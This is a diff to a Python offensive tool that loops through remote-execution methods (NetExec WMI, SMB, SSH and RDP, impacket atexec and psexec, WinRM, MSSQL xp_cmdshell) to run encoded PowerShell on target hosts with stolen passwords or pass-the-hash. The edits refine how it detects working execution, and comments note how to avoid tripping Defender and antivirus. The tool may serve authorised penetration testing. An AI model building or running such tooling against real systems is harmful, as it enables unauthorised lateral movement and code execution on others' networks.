@@ -20,7 +20,7 @@ RUN_ALL = False
 SKIP_PORTSCAN = False
 
 VALID_TOOLS = ["winrm", "smbexec", "wmi", "ssh", "mssql", "psexec", "atexec", "rdp"]
-NXC_TOOLS = {"smbexec", "wmi", "ssh", "atexec", "rdp"}
+NXC_TOOLS = {"smbexec", "wmi", "ssh", "rdp"}
 
 IMPACKET_PREFIX = "impacket-"  # or "" for .py suffix
 NXC_CMD = "nxc"
@@ -227,9 +227,11 @@ def build_cmd(tool, user, target, credential, command, show_output=False):
                 f"{NXC_CMD} smb {target} -p {credential} -u \"{user}\" -X 'powershell -enc {b64}' --exec-method smbexec{nxc_output_flag}")
 
     if tool == "wmi":
-        return (f"{NXC_CMD} wmi {target} -H {hash_val} -u \"{user}\" -x 'powershell -enc {b64}'{nxc_output_flag}"
+        # we don't actually need to pass the --no-output here, as defender won't catch it regardless it seems
+        # additionally, adding --no-output makes it very difficult to differentiate between command execution and a successful authentication w/o execution
+        return (f"{NXC_CMD} wmi {target} -H {hash_val} -u \"{user}\" -x 'powershell -enc {b64}'"
                 if use_hash else
-                f"{NXC_CMD} wmi {target} -p {credential} -u \"{user}\" -x 'powershell -enc {b64}'{nxc_output_flag}")
+                f"{NXC_CMD} wmi {target} -p {credential} -u \"{user}\" -x 'powershell -enc {b64}'")
 
     if tool == "ssh":
         return f"{NXC_CMD} ssh {target} -p {credential} -u \"{user}\" -x 'powershell -enc {b64}'{nxc_output_flag}"
@@ -290,7 +292,7 @@ def run_chain(user, ip, credential, command, tool_list=None, show_output=False):
                     # psexec succeeded and exited (sometimes with rc 1!)
                     if RUN_ALL:
                         # need to run all tools, even if we succeeded
-                        safe_print(f"[+] Success! With command: {cmd}")
+                        safe_print(f"  [+] Success! With command: {cmd}")
                         oprint(out)
                         continue
                     return (tool, out, cmd)
@@ -314,7 +316,7 @@ def run_chain(user, ip, credential, command, tool_list=None, show_output=False):
                 safe_print(f"  [-] For {ip}: {tool} failed.")
                 continue
 
-        if tool in NXC_TOOLS:
+        if tool in NXC_TOOLS or tool == "atexec":
             if '[-]' in out:
                 if "Could not retrieve" in out:
                     safe_print(f"  \033[33m[!]\033[0m For {ip}: {tool} AUTHENTICATION succeeded as {user} with {credential}, but likely failed to run command. Try running without -o to avoid tripping AV.")
@@ -322,11 +324,14 @@ def run_chain(user, ip, credential, command, tool_list=None, show_output=False):
                 else:
                     safe_print(f"  [-] For {ip}: {tool} failed.")
                 continue
+            if '[+]' in out and 'Executed command' not in out:
+                safe_print(f"  \033[33m[!]\033[0m For {ip}: {tool} AUTHENTICATION succeeded as {user} with {credential}, but seemingly failed to run command. Does the user have the necessary permissions?")
+                continue
             if rc == 0 and out == "":
                 # nxc tools will sometimes just fail silently
                 safe_print(f"  [-] For {ip}: {tool} failed.")
                 continue
-    
+
         if tool == "mssql" and "ERROR" in out:
             safe_print(f"  [-] For {ip}: {tool} failed.")
             continue
@@ -335,7 +340,7 @@ def run_chain(user, ip, credential, command, tool_list=None, show_output=False):
         if rc == 0 or (tool in ("winrm", "winrm-ssl") and rc == 1 and "NoMethodError" in out): 
             if RUN_ALL:
                 # need to run all tools, even if we succeeded
-                safe_print(f"[+] Success! With command: {cmd}")
+                safe_print(f"  [+] Success! With command: {cmd}")
                 oprint(out)
                 continue
             return (tool, out, cmd)
@@ -375,7 +380,7 @@ def execute_on_ip(username, ip, credential, command, tool_list=None, show_output
         return (ip, None)
 
     tool, out, cmd = result
-    safe_print(f"[+] Success! With command: {cmd}")
+    safe_print(f"  [+] Success! With command: {cmd}")
     if tool == "mssql":
         safe_print(f"\033[33m[!] WARNING: MSSQL used for command execution; xp_cmdshell is currently enabled on {ip}. \033[0m")
     oprint(out)
